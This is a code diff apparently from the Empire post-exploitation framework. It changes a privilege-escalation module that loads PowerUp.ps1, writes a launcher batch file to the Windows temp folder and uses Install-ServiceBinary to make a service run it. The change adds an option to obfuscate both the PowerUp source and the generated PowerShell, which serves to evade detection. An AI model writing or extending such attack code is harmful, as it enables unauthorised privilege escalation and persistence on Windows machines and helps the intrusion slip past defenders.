@@ -81,11 +81,13 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
 
         # read in the common powerup.ps1 module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/privesc/PowerUp.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -115,15 +117,17 @@ class Module:
 
 
         # PowerShell code to write the launcher.bat out
-        script += "$tempLoc = \"$env:temp\\debug.bat\""
-        script += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
-        script += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
-        script += "\"Launcher bat written to $tempLoc `n\";\n"
+        scriptEnd = ";$tempLoc = \"$env:temp\\debug.bat\""
+        scriptEnd += "\n$batCode = @\"\n" + launcherCode + "\"@\n"
+        scriptEnd += "$batCode | Out-File -Encoding ASCII $tempLoc ;\n"
+        scriptEnd += "\"Launcher bat written to $tempLoc `n\";\n"
   
         if launcherCode == "":
             print helpers.color("[!] Error in launcher .bat generation.")
             return ""
         else:
-            script += "\nInstall-ServiceBinary -ServiceName \""+str(serviceName)+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C $tempLoc\""    
-
+            scriptEnd += "\nInstall-ServiceBinary -ServiceName \""+str(serviceName)+"\" -Command \"C:\\Windows\\System32\\cmd.exe /C $tempLoc\""    
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
